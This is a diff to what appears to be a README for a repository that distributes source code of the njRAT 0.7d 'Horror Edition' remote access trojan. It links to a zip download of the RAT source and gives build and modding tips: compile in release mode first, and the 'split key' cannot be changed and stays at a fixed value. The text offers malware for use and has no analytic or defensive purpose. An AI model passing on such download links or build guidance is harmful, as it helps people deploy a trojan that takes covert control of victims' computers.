@@ -3,6 +3,9 @@
  njRAT 0.7d Horror Edition - SRC is in RAR file because github not allow upload more than 100 file at once
  downlaod from here: https://github.com/De-eloper/SOURCE-CODE-njRAT-0.7d-Horror-Edition/archive/refs/heads/main.zip
  
+note that changing split key isnt working, i ran into error trying to mod njrat src split key before
+it will not function or respond to commands for some reason, i dont have a fix to it
+so split key is stuck for Y262SUCZ4UJJ
 
 before editing or opening code/forms in the njRAT 0.7d Horror Edition - SRC, compile in release mode!
 you will run into unfixable errors if you do not do that first!
